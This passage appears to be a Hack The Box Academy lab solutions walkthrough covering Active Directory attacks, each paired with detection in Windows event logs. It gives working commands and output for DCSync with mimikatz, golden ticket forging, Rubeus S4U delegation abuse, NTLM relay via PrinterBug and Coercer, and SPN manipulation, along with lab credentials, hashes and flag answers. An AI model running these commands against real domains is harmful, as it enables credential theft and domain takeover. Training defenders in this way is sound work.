[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, they need to open Command Prompt, so that they may launch another instance of cmd.exe as the `rocky` user (authenticate as `rocky:Slavi123`):

Code: cmd

```cmd
runas /user:eagle\rocky cmd.exe
```

```
Microsoft Windows [Version 10.0.19044.2728]
(c) Microsoft Corporation. All rights reserved.

C:\Users\bob>runas /user:eagle\rocky cmd.exe
Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky" ...
```

![[HTB Solutions/CDSA/z. images/57827fb7d1acc75db4b37beae5297b22_MD5.jpg]]

From the newly created `cmd.exe` shell students need to use `mimikatz.exe` to `DCSync` the administrator user:

Code: cmd

```cmd
C:\Mimikatz\mimikatz.exe
lsadump::dcsync /domain:eagle.local /user:Administrator
```

```
Microsoft Windows [Version 10.0.19044.2728]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>C:\Mimikatz\mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 02.00.00
Password last change : 07/08/2022 21.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf

<SNIP>
```

After performing DCSync, students will find the NTLM hash is `fcdc65703dd2b0bd789977f1f3eeaecf`.

Answer: `fcdc65703dd2b0bd789977f1f3eeaecf`

# DCSync

## Question 2

### "After performing the DCSync attack, connect to DC1 as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the Task Category of the Events generated by the attack?"

From the previously established RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` and open Event Viewer:

![[HTB Solutions/CDSA/z. images/0bc1f9e755fd5250ffe78a7f08084f88_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/467b021ae150084148657846cd24a31b_MD5.jpg]]

To find the event, students need to go to Windows Logs -> Security, and right click to Filter Current Log:

![[HTB Solutions/CDSA/z. images/c92a5f8363af86fd318027311319a95f_MD5.jpg]]

Replacing `<All Event IDs>` with `4662`:

![[HTB Solutions/CDSA/z. images/4a989cec59e69903dcf51f186282bf7f_MD5.jpg]]

Students will see that in Event Viewer, the task category defines DC replication as `Directory Service Access`.

Answer: `Directory Service Access`

# Golden Ticket

## Question 1

### "Practice the techniques shown in this section. What is the NTLM hash of the krbtgt user?"

Students need to connect to the target machine as `bob:Slavi123` with Remote Desktop Protocol:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.204.151 /u:bob /p:Slavi123 /dynamic-resolution

[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, they need to open Command Prompt, so that they may launch another instance of cmd.exe as the `rocky` user (authenticate as `rocky:Slavi123`):

Code: cmd

```cmd
runas /user:eagle\rocky cmd.exe
```

```
Microsoft Windows [Version 10.0.19044.2728]
(c) Microsoft Corporation. All rights reserved.

C:\Users\bob>runas /user:eagle\rocky cmd.exe
Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky" ...
```

![[HTB Solutions/CDSA/z. images/57827fb7d1acc75db4b37beae5297b22_MD5.jpg]]

From the newly created `cmd.exe`, students need to use `mimikatz.exe` to `DCSync` the `krbtgt` user:

Code: cmd

```cmd
C:\Mimikatz\mimikatz.exe
lsadump::dcsync /domain:eagle.local /user:krbtgt
```

```
Microsoft Windows [Version 10.0.19044.2728]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>C:\Mimikatz\mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 07/08/2022 21.26.54
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: db0d0630064747072a7da3f7c3b4069e
    ntlm- 0: db0d0630064747072a7da3f7c3b4069e
    lm  - 0: f298134aa1b3627f4b162df101be7ef9
```

Students are encouraged to continue the attack chain, using the RC4 hash and domain SID to forge a golden ticket for the domain Administrator:

Code: cmd

```cmd
kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

```
mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

User      : Administrator
Domain    : eagle.local (EAGLE)
SID       : S-1-5-21-1518138621-4282902758-752445584
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: db0d0630064747072a7da3f7c3b4069e - rc4_hmac_nt
Lifetime  : 17/04/2023 22.44.42 ; 17/04/2023 22.52.42 ; 17/04/2023 22.51.42
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ eagle.local' successfully submitted for current session
```

Exiting `mimikatz`, students need to use `klist` to confirm the ticket has been imported.

Code: cmd

```cmd
exit
klist
```

```
mimikatz # exit
Bye!

C:\WINDOWS\system32>klist

Current LogonId is 0:0x22a1a8

Cached Tickets: (1)

#0>     Client: Administrator @ eagle.local
        Server: krbtgt/eagle.local @ eagle.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 4/17/2023 22:44:42 (local)
        End Time:   4/17/2023 22:52:42 (local)
        Renew Time: 4/17/2023 22:51:42 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Authentication to the domain controller should now be possible:

Code: cmd

```cmd
dir \\dc1\c$
```

```
C:\WINDOWS\system32>dir \\dc1\c$

 Volume in drive \\dc1\c$ has no label.
 Volume Serial Number is 2245-F76F

 Directory of \\dc1\c$

15/10/2022  18.30    <DIR>          DFSReports
13/10/2022  23.23    <DIR>          Mimikatz
01/09/2022  21.49    <DIR>          PerfLogs
30/03/2023  11.30    <DIR>          Program Files
01/09/2022  14.02    <DIR>          Program Files (x86)
05/04/2023  13.15    <DIR>          scripts
07/08/2022  21.31    <DIR>          Users
28/11/2022  12.27    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)   1.114.910.720 bytes free
```

Now, students need to check for triggered events. From the established RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` and open Event Viewer:

![[HTB Solutions/CDSA/z. images/0bc1f9e755fd5250ffe78a7f08084f88_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/467b021ae150084148657846cd24a31b_MD5.jpg]]

To find the corresponding events, students need to go to Windows Logs -> Security, and right click to Filter Current Log:

![[HTB Solutions/CDSA/z. images/c92a5f8363af86fd318027311319a95f_MD5.jpg]]

Replacing `<All Event IDs>` with `4624`, students will need to search through multiple events, eventually discovering what appears to be a regular logon event for EAGLE\\Administrator:

![[HTB Solutions/CDSA/z. images/ff4c3363deb582e08553a53ce26b1f54_MD5.jpg]]

The consideration for blue teamers would be if it makes sense for a domain Administrator to be logging in from this IP address.

Additionally, students need to filter for Event ID `4769`:

![[HTB Solutions/CDSA/z. images/00422b19a84d3b6b309fca28b6040b6c_MD5.jpg]]

Students will find a TGS ticket request, as a result of the previous connection attempt to DC1. Again, it would be necessary to validate the client IP address to determine malicious or legitimate activity.

Having completed both the attack and event analysis, students need to submit the `krbtgt` hash of `db0d0630064747072a7da3f7c3b4069e` to complete the section.

Answer: `db0d0630064747072a7da3f7c3b4069e`

# Kerberos Constrained Delegation

## Question 1

### "Use the techniques shown in this section to gain access to the DC1 domain controller and submit the contents of the flag.txt file."

Students need to connect to the target machine as `bob:Slavi123` with Remote Desktop Protocol:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.204.151 /u:bob /p:Slavi123 /dynamic-resolution

[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Next, students need to open PowerShell as administrator and navigate to the Downloads directory:

Code: powershell

```powershell
cd C:\Users\bob\Downloads\
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> cd C:\Users\bob\Downloads\
```

To gain access to DC1, students need to use Rubeus.exe, abusing the `webservice` user's constrained delegation rights to DC1 for the HTTP service:

Code: powershell

```powershell
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```

```
PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: S4U

[*] Using rc4_hmac hash: FCDC65703DD2B0BD789977F1F3EEAECF
[*] Building AS-REQ (w/ preauth) for: 'eagle.local\webservice'
[+] TGT request successful!
[*] base64(ticket.kirbi):

<SNIP>

[*] Action: S4U

[*] Using domain controller: dc1.eagle.local (172.16.18.3)
[*] Building S4U2self request for: 'webservice@EAGLE.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'webservice@EAGLE.LOCAL'
[*] base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIExDCCBMBhggS8MIIEuKADAgEFoQ0bC0VBR0xFLkxPQ0FMohcwFaAD
<SNIP>

[*] Impersonating user 'Administrator' to target SPN 'http/dc1'
[*] Using domain controller: dc1.eagle.local (172.16.18.3)
[*] Building S4U2proxy request for service: 'http/dc1'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/dc1':

      doIGOjCCBjagAwIBBaEDAgEWooIFVzCCBVNhggVPMIIFS6ADAgEFoQ0bC0VBR0xFLkxPQ0FMohYwFKAD
<SNIP>
[+] Ticket successfully imported!
```

Subsequently, students need to use the `klist` command to confirm the ticket is loaded into the current PowerShell session:

Code: poweshell

```poweshell
klist
```

```
PS C:\Users\bob\Downloads> klist

Current LogonId is 0:0xaba81

Cached Tickets: (1)

#0>     Client: Administrator @ EAGLE.LOCAL
        Server: http/dc1 @ EAGLE.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 4/17/2023 23:19:30 (local)
        End Time:   4/18/2023 9:19:30 (local)
        Renew Time: 4/24/2023 23:19:30 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

Confirming that the ticket has been loaded, students need to enter a remote PowerShell session on DC1 to find the flag:

Code: powershell

```powershell
Enter-PSSession dc1
```

```
PS C:\Users\bob\Downloads> Enter-PSSession dc1
[dc1]: PS C:\Users\Administrator\Documents> cat .\flag.txt
C0nsTr@in3D_F1@G_Dc01!
```

Now, students need to check for triggered events. From the established RDP session, students need to click the Start button and type Remote Desktop Connection:

![[HTB Solutions/CDSA/z. images/eadbdef59e6c4a2ac46d8e3470b22a72_MD5.jpg]]

Selecting Remote Desktop Connection, students will select Show Options when prompted:

![[HTB Solutions/CDSA/z. images/b38c50357c3e30ba9b3558883e1e48e3_MD5.jpg]]

Students need to connect to DC1 as `htb-student:HTB_@cademy_stdnt!` and open Event Viewer:

![[HTB Solutions/CDSA/z. images/0bc1f9e755fd5250ffe78a7f08084f88_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/467b021ae150084148657846cd24a31b_MD5.jpg]]

To find the corresponding events, students need to go to Windows Logs -> Security, and right click to Filter Current Log:

![[HTB Solutions/CDSA/z. images/c92a5f8363af86fd318027311319a95f_MD5.jpg]]

Replacing `<All Event IDs>` with `4624`, students should be able to find the event, showcasing that the successful logon for the domain administrator came by way of the webservice user:

![[HTB Solutions/CDSA/z. images/ab6f9cebed97e6af7fcd7d68661aa8c8_MD5.jpg]]

Once complete, students need to submit the previously obtained flag, `C0nsTr@in3D_F1@G_Dc01!`.

Answer: `C0nsTr@in3D_F1@G_Dc01!`

# Print Spooler & NTLM Relaying

## Question 1

### "What is Kerberos des-cbc-md5 key for user Administrator?"

Students need to connect (`kali:kali`) to the Kali host with RDP:

Code: shell

```shell
xfreerdp /v:STMIP /u:kali /p:kali /dynamic-resolution
```

```
┌─[us-academy-2]─[10.10.14.220]─[htb-ac-594497@htb-z7uyk0jo71]─[~]
└──╼ [★]$ xfreerdp /v:10.129.100.146 /u:kali /p:kali /dynamic-resolution 

[23:40:51:726] [4536:4537] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[23:40:51:726] [4536:4537] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
<SNIP>
```

Once connected, students need to open a new terminal within Kali:

![[HTB Solutions/CDSA/z. images/09d991b84d1308758b63f7ef3a6200df_MD5.jpg]]

With the terminal open, students need to switch to the root user, then start `impacket-ntlmrelayx`:

Code: shell

```shell
sudo su
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

```
┌──(kali㉿kali)-[~]
└─$ sudo su

[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali]
└─# impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Consequently, students need to then open a New Tab in the terminal, switch to root, and run `dementor.py`:

Code: shell

```shell
sudo su
cd tools
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

```
┌──(kali㉿kali)-[~]
└─$ sudo su

[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali]
└─# cd tools 

┌──(root㉿kali)-[/home/kali/tools]
└─# python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

[*] connecting to 172.16.18.4
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[*] Got expected RPC_S_SERVER_UNAVAILABLE exception. Attack worked
[*] done!
```

Triggering the remote connection, students need to check the other terminal tab :

```
<SNIP>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcdc65703dd2b0bd789977f1f3eeaecf:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
Administrator:aes128-cts-hmac-sha1-96:4667ae9266d48c01956ab9c869e4370f
Administrator:des-cbc-md5:d9b53b1f6d7c45a8
```

The NTLM relay was successful, bouncing the connection from DC1, to the attack host, to DC2, triggering the DCSync.

Subsequently, to view the logs, students must connect to DC2 as `htb-student:HTB_@cademy_stdnt!`:

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:172.16.18.4 /dynamic-resolution

[18:12:05:039] [3396:3397] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[18:12:05:039] [3396:3397] [WARN][com.freerdp.crypto] - CN = DC1.eagle.local
[18:12:05:039] [3396:3397] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:12:05:039] [3396:3397] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[18:12:05:039] [3396:3397] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:12:05:039] [3396:3397] [ERROR][com.freerdp.crypto] - The hostname used for this connection (172.16.18.3:3389) 
[18:12:05:039] [3396:3397] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
```

Once connect to the second domain controller, students need to open Event Viewer and filter for event ID `4624`. Students will find an account logon for DC1$, along with source network address not matching that of the domain controller:

![[HTB Solutions/CDSA/z. images/c084dd45f20044c20b49dda1cf5e6802_MD5.jpg]]

This is indicative of a successful `DCsync` attack. Additionally, students should note that this event does not appear on the other domain controller, DC1.

Moving on, students can refer back to the terminal running` impacket-ntlmrelayx`, finding the Administrator user's Kerberos `des-cbc-md5 `key to be `d9b53b1f6d7c45a8`.

Answer: `d9b53b1f6d7c45a8`

# Print Spooler & NTLM Relaying

## Question 2

### "After performing the previous attack, connect to DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and make the appropriate change to the registry to prevent the PrinterBug attack. Then, restart DC1 and try the same attack again. What is the error message seen when running dementor.py?"

From the Kali host, students need to RDP to DC1 as `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:172.16.18.3 /dynamic-resolution
```

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:172.16.18.3 /dynamic-resolution

[20:33:59:408] [28581:28582] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:33:59:408] [28581:28582] [WARN][com.freerdp.crypto] - CN = DC1.eagle.local
[20:33:59:409] [28581:28582] [ERROR][com.freerdp.crypto] - 
<SNIP>
```

Once connected to DC1, students need to open regedit:

![[HTB Solutions/CDSA/z. images/70bddd22bee55ba842fada739c6573af_MD5.jpg]]

There, they will need to navigate to `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers`:

![[HTB Solutions/CDSA/z. images/91776f6859405ced0d45195f5bfee9f3_MD5.jpg]]

The `RegisterSpoolerRemoteRpcEndpoint` Value Data must be set to `2`:

![[HTB Solutions/CDSA/z. images/069296f90e04d83f26ed335044797993_MD5.jpg]]

Students need to click OK, then Start -> Restart , restarting the DC1 machine. After a few moments, they need to run dementor.py again:

Code: shell

```shell
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

```
┌──(root㉿kali)-[/home/kali/tools]
└─# python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

[*] connecting to 172.16.18.3
[-] unhandled exception occured: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
```

This time, the attack fails. Consequently, the error message reads: `[-] unhandled exception occured: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)`.

Answer: `[-] unhandled exception occured: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)`

# Coercing Attacks & Unconstrained Delegation

## Question 1

### "Repeat the examples shown in the section, and type DONE as the answer when you are finished."

Students need to connect (`kali:kali`) to the Kali host with RDP:

Code: shell

```shell
xfreerdp /v:STMIP /u:kali /p:kali /dynamic-resolution 
```

```
┌─[us-academy-2]─[10.10.14.220]─[htb-ac-594497@htb-z7uyk0jo71]─[~]
└──╼ [★]$ xfreerdp /v:10.129.100.146 /u:kali /p:kali /dynamic-resolution 

[23:40:51:726] [4536:4537] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[23:40:51:726] [4536:4537] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
<SNIP>
```

From Kali, students need to open a terminal and connect to WS001 as `bob:Slavi123` using RDP:

Code: shell

```shell
xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resoluti
```

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resolution

[21:16:51:962] [2078:2079] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[21:16:51:963] [2078:2079] [WARN][com.freerdp.crypto] - CN = WS001.eagle.local
[21:16:53:669] [2078:2079] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[21:16:53:669] [2078:2079] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
```

![[HTB Solutions/CDSA/z. images/f21d210f5b8f64eff891855ef4744ccc_MD5.jpg]]

Students need to open PowerShell as administrator on `WS001`, and use `Rubeus.exe` to monitor the TGT cache:

Code: powershell

```powershell
C:\Users\bob\Downloads\Rubeus.exe monitor /interval:1
```

![[HTB Solutions/CDSA/z. images/07af010fff98351b342a454411341d4c_MD5.jpg]]

From the Kali host, students need to use Coercer, which forces the connection from DC1 to the WS001 machine.

Code: shell

```shell
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

```
┌──(kali㉿kali)-[~]
└─$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[dc1.eagle.local] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to ws001.eagle.local ...
   [>] Pipe '\PIPE\lsarpc' is accessible!
<SNIP>
RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx' (opnum 65) ... rpc_s_access_denied (Attack should have worked!)       

[+] All done!
```

Due to the unconstrained delegation, the TGT is stored in memory on WS001, allowing Rubeus to find it:

![[HTB Solutions/CDSA/z. images/4a894e8080bd73c051f75cce864dc174_MD5.jpg]]

Having completed the attack, students need to enter `DONE` to finish the section.

However, if students want to also look at the related logs, they will need to connect as `htb-student:HTB_@cademy_stdnt!` to DC1 with RDP, from inside the RDP session to WS001, and configure the Windows Defender Firewall, as follows.

![[HTB Solutions/CDSA/z. images/4964a7e56029081e91c80c5260fcfe41_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/d4eb723ef0927cbd9fef09b28d6839f6_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/95b938ce59e75b34a3ba6bc174919919_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/3606b71246fc08a1afffb65ec67eb228_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/699db6f54985a3cc48fff62e30077783_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/1a34122aa387eee9ce398e402d723d4a_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/69a20a9e0359d28db11a90c737abc5a0_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/1f7356d19e66bb959f20459e7b599413_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/3307b16dfc12962da5c3c03399a2adba_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/239e3b060a3c498dc6581e31045a11b2_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/405a0411ec0590258bf5b077bc057b1f_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/8665b64d73bd8769f64df824200b991f_MD5.jpg]]

![[HTB Solutions/CDSA/z. images/811f20601f2642b3ed8de18ef0e5b9dd_MD5.jpg]]

Now let's replicate the whole attack flow again.

We notice that no ticket will arrive this time for the user `DC1$@EAGLE.LOCAL` inside Rubeus.

To can see the `DROP` connections inside the Windows Firewall logs, students first need to first spawn a PowerShell terminal as `eagle\htb-student`, providing the password `HTB_@cademy_stdnt!` when prompted for it:

Code: powershell

```powershell
runas /user:eagle\htb-student PowerShell
```

In the spawned PowerShell prompt, students then need to print out the contents of the file `C:\Windows\System32\LogFiles\Firewall\pfirewall.log` as `DC1`:

Code: powershell

```powershell
New-PSSession DC1
Enter-PSSession DC1
type C:\Windows\System32\LogFiles\Firewall\pfirewall.log | findstr DROP
```

![[HTB Solutions/CDSA/z. images/d96b46c27896d49747b6571d89831a91_MD5.jpg]]

Answer: `DONE`

# Object ACLs

## Question 1

### "Repeat the example in the section and type DONE as the answer when you are finished"

Students need to connect to the target machine as `bob:Slavi123` with Remote Desktop Protocol:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Slavi123 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.70]─[htb-ac-594497@htb-k2fkrctljt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.204.151 /u:bob /p:Slavi123 /dynamic-resolution 

[01:25:43:763] [5685:5686] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[01:25:43:763] [5685:5686] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Next, students need to open Command Prompt as Administrator, so they can delete and then re-add a Service Principal Name to the anni user:

Code: cmd

```cmd
setspn -D http/ws001 anni
setspn -U -s ldap/ws001 anni
```

```
Microsoft Windows [Version 10.0.19044.2728]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>setspn -D http/ws001 anni

Unregistering ServicePrincipalNames for CN=anni,OU=EagleUsers,DC=eagle,DC=local
        http/ws001
Updated object

C:\WINDOWS\system32>setspn -U -s ldap/ws001 anni

Checking domain DC=eagle,DC=local

Registering ServicePrincipalNames for CN=anni,OU=EagleUsers,DC=eagle,DC=local
        ldap/ws001
```

Students should also recognize that the Bob user has `GenericAll` permissions over the computer SERVER01 machine, so another SPN can be set:

Code: cmd

```cmd
setspn -S ldap/server02 server01
```

```
C:\WINDOWS\system32>setspn -S ldap/server02 server01

